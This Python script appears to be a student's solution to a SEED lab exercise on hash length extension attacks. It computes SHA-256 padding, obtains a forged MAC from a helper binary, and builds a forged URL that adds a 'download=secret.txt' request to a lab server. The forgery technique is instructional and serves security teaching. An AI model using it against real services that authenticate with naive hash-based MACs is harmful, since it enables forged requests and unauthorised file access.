#!/usr/bin/env python3
"""
Task 3 - Hash Length Extension Attack
Forge a valid MAC for a new request without knowing the secret key.

Original request: lstcmd=1
Forged request  : lstcmd=1 + padding + &download=secret.txt
"""

import hashlib
import subprocess

NAME = "MohammedTahaHathouti"
UID  = "1001"
KEY  = "123456"         # known to verify correctness; NOT used for forging

# --- Step 1: original MAC (from Task 1) ---
original_msg = f"{KEY}:myname={NAME}&uid={UID}&lstcmd=1"
original_mac = hashlib.sha256(original_msg.encode()).hexdigest()
print(f"Original message : {original_msg}")
print(f"Original MAC     : {original_mac}")

# --- Step 2: compute padding (same as Task 2) ---
msg_len    = len(original_msg.encode())
block_size = 64
pad_len    = block_size - (msg_len % block_size) or block_size
bit_len    = msg_len * 8

padding  = b'\x80'
padding += b'\x00' * (pad_len - 1 - 8)
padding += bit_len.to_bytes(8, 'big')

url_padding = ''.join(f'%{b:02x}' for b in padding)
print(f"\nPadding (URL-encoded): {url_padding}")

# --- Step 3: run length_ext binary to get forged MAC ---
result = subprocess.run(
    ['./length_ext'],
    capture_output=True, text=True
)
forged_mac = result.stdout.strip().split(': ')[-1]
print(f"Forged MAC       : {forged_mac}")

# --- Step 4: build the forged URL ---
forged_url = (
    f"http://www.seedlab-hashlen.com/"
    f"?myname={NAME}&uid={UID}"
    f"&lstcmd=1{url_padding}"
    f"&download=secret.txt"
    f"&mac={forged_mac}"
)
print(f"\nForged URL:\n{forged_url}")

# --- Verification: what the server will compute ---
# The server reconstructs: key + ':' + myname=...&uid=...&lstcmd=<cmd>&download=secret.txt
# where <cmd> is the raw lstcmd value (1 + padding bytes)
cmd_bytes  = b'1' + padding
server_msg = f"myname={NAME}&uid={UID}&lstcmd=".encode() + cmd_bytes + b"&download=secret.txt"
server_payload = KEY.encode() + b':' + server_msg
server_mac = hashlib.sha256(server_payload).hexdigest()
print(f"\n[Verification] Server expected MAC : {server_mac}")
print(f"[Verification] Forged MAC matches  : {forged_mac == server_mac}")
